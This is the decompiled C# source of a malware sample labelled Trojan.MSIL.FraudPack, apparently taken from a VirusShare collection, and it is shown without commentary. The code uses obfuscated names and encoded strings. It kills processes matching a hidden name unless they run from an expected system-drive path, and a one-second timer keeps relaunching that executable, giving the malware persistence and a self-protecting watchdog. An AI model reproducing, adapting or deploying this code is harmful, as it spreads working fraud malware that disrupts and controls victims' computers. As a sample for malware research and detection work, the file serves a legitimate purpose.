// Decompiled with JetBrains decompiler
// Type: 
// Assembly: crss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A65BA6D5-D800-4C42-A1F1-7D131391B3D8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.FraudPack.m-c9d6af6d6a8af018de78446249abcc7575778a3b852f83f32fc70008c86f78dc.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Permissions;
using System.Timers;
using System.Windows.Forms;

internal static class \u0005
{
  [STAThread]
  [PermissionSet(SecurityAction.LinkDemand, XML = "<PermissionSet class=\"System.Security.PermissionSet\"\r\nversion=\"1\"/>\r\n")]
  private static void \u0002()
  {
    string str = Convert.ToString(Path.GetPathRoot(Environment.SystemDirectory)[0]);
    Process[] processesByName = Process.GetProcessesByName(\u0008.\u0002(1725855144));
    int num = 0;
    for (int index = 0; index < processesByName.Length; ++index)
    {
      if (processesByName[index].MainModule.FileName != str + \u0008.\u0002(1725855165))
        processesByName[index].Kill();
      else
        ++num;
    }
    if (num >= 2)
      Environment.Exit(0);
    System.Timers.Timer timer = new System.Timers.Timer(1000.0);
    timer.Elapsed += new ElapsedEventHandler(\u0005.\u0002);
    timer.AutoReset = true;
    timer.Enabled = true;
    Application.Run();
  }

  private static void \u0002(object _param0, ElapsedEventArgs _param1)
  {
    string str = Convert.ToString(Path.GetPathRoot(Environment.SystemDirectory)[0]);
    Process[] processesByName = Process.GetProcessesByName(\u0008.\u0002(1725855073));
    bool flag = false;
    for (int index = 0; index < processesByName.Length; ++index)
    {
      if (processesByName[index].MainModule.FileName != str + \u0008.\u0002(1725855088))
        processesByName[index].Kill();
      else
        flag = true;
    }
    if (flag)
      return;
    Process.Start(str + \u0008.\u0002(1725855088));
  }
}
